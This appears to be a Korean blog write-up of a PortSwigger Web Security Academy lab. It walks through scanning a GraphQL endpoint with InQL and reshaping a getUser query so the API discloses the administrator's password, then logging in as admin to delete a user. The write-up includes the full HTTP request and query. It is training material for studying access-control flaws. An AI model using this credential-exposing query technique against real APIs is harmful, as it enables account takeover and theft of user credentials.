---
layout: post
title: "Burp Academy-GraphQL API 관련 취약점: Accidental exposure of private GraphQL fields"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, GraphQL]
toc: true
last_modified_at: 2023-11-08 09:50:00 +0900
---


# 개요
- GraphQL 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure
- 취약점 설명페이지: https://portswigger.net/web-security/graphql
- 난이도: PRACTITIONER (보통)

# 문제 개요

- 이 랩에 있는 유저 관리 기능에는 GraphQL 엔드포인트가 있다. 
- 접근 제어 부분에 취약점이 있어 이를 이용하면 유저 크레덴셜을 볼 수 있다. 
- 관리자로 로그인해서 carlos유저를 삭제하면 문제가 풀린다. 

```
The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```

# 풀이
## GraphQL 엔드포인트 찾기 
일단 GraphQL 엔드포인트를 찾는게 가장 먼저다. 앱을 만져보면 로그인시나 블로그 글 조회시 등에 `/graphql/v1` 엔드포인트로 요청을 하는 것을 볼 수 있다. 

## InQL실행
이 엔드포인트에 대해 InQL 스캔을 실시한다. 그러면 다음과 같이 스키마 정보를 획득한 것을 볼 수 있다. getUser 쿼리가 눈에 띈다. 

![InSQL스캔 실행](/images/burp-academy-graphql-2-1.png)

## getUSer 쿼리 실행
GraphQL요청을 Repeater로 보내서 쿼리를 getUser 쿼리로 바꿔본다. 

```http
POST /graphql/v1 HTTP/2
Host: 0a41003c0490e986831b6fdb00e30015.web-security-academy.net
Cookie: session=sh8ARKJJ07INxlLKcivIfnf3wVPBFAhU; session=sh8ARKJJ07INxlLKcivIfnf3wVPBFAhU
Content-Length: 127
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0a41003c0490e986831b6fdb00e30015.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a41003c0490e986831b6fdb00e30015.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"variables": {"id": 1}, "query": "query {\n    getUser(id: Int!) {\n        id\n        password\n        username\n    }\n}"}
```

그러자 다음과 같은 응답이 돌아왔다. 뭔가 문법이 잘못되었다는 것 같다. 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 206

{
  "errors": [
    {
      "locations": [
        {
          "line": 2,
          "column": 20
        }
      ],
      "message": "Invalid syntax with offending token '!' at line 2 column 20"
    }
  ]
}
```

![문법 에러](/images/burp-academy-graphql-2-2.png)


## 에러 원인 파악 및 수정 
비슷하게 생긴 getBlogPost쿼리를 살펴본다. 

InQL 스캔결과에서 획득한 쿼리와 실제로 앱 사용중에 전송되는 쿼리가 생긴게 조금 다르다는 것으 알 수 있다. 

앱 사용시에 관측한 쿼리는 다음과 같다. 

```
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        image
        title
        author
        date
        paragraphs
    }
}
```

InQL 결과에서는 이렇게 생겼다. 

```
query {
    getBlogPost(id: Int!) {
        author
        date # Timestamp scalar
        id
        image
        paragraphs
        summary
        title
    }
}
```

다음이 다르다. 

1. 실제 동작하는 쿼리는 query 다음에 `getBlogPost($id: Int!)` 를 붙여주는 부분이 있다. 
2. 실제 동작하는 쿼리는 `getBlogPost(id: Int!)` 대신에 `getBlogPost(id: $id)` 가 들어가 있다. 

동일한 요령을 getUser쿼리에 적용하면 다음과 같이 된다. 

다음 쿼리가

```
query {
    getUser(id: Int!) {
        id
        password
        username
    }
}
```

다음과 같이 바뀐다. 

```
query getUser($id: Int!){
    getUser(id: $id) {
        id
        password
        username
    }
}
```

## getUser 쿼리 재실행 
`{"id" 1}` 을 변수로 해서 보내본다. 그러면 다음과 같이 관리자의 크레덴셜을 획득할 수 있다. 

![관리자 크레덴셜 획득](/images/burp-academy-graphql-2-3.png)

## 관리자로 로그인해서 calor유저 삭제
관리자 username과 패스워드로 로그인한 후에 관리자 패널에서 carlos유저를 삭제하면 다음과 같이 문제가 풀렸다는 메세지가 출력된다. 

![관리자 로그인](/images/burp-academy-graphql-2-success.png)